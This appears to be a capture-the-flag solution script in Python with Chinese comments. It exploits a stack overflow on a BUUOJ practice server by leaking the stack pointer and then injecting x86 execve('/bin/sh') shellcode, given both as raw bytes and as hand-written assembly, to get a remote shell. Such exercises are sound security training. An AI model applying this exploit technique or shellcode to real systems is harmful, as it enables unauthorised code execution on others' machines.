# 一道挺特别的题，题目只有少量代码
from pwn import *

context(os = 'linux', arch = 'i386')
# context.log_level = 'debug'
p = remote('node4.buuoj.cn', 25383)
call_write = 0x8048087

offset = 0x14
payload1 = b'a'*offset + p32(call_write)
p.sendafter(b'Let\'s start the CTF:', payload1) # 这里不能sendline，否则多出的换行符刚好会覆盖esp的最低字节
esp = u32(p.recv(4))
p.debug(hex(esp))

# pwntools的shellcraft.sh()太长了，所以不能用
# 别人的shellcode
# shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

# commands = disasm(b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')
# print(commands)
'''
   0:   31 c9                   xor    ecx, ecx
   2:   f7 e1                   mul    ecx
   4:   51                      push   ecx
   5:   68 2f 2f 73 68          push   0x68732f2f
   a:   68 2f 62 69 6e          push   0x6e69622f
   f:   89 e3                   mov    ebx, esp
  11:   b0 0b                   mov    al, 0xb
  13:   cd 80                   int    0x80
'''

# 也可以自己手写shellcode
myshellcode = asm('''
xor ecx,ecx;     #ecx设置为0
xor edx,edx;	#edx设置为0
push edx;		#将edx的值压入栈
push 0x0068732f;
push 0x6e69622f;
mov ebx,esp;    #将ebx设置为'/bin/sh'的16进制 
mov eax,0xb;    #eax设置为0xb，调用execve
int 0x80
''')
print(len(myshellcode), myshellcode)
payload2 = b'a'*offset + p32(esp + offset) + myshellcode
# print(len(asm(shellcraft.sh())))
p.sendline(payload2)
p.interactive()

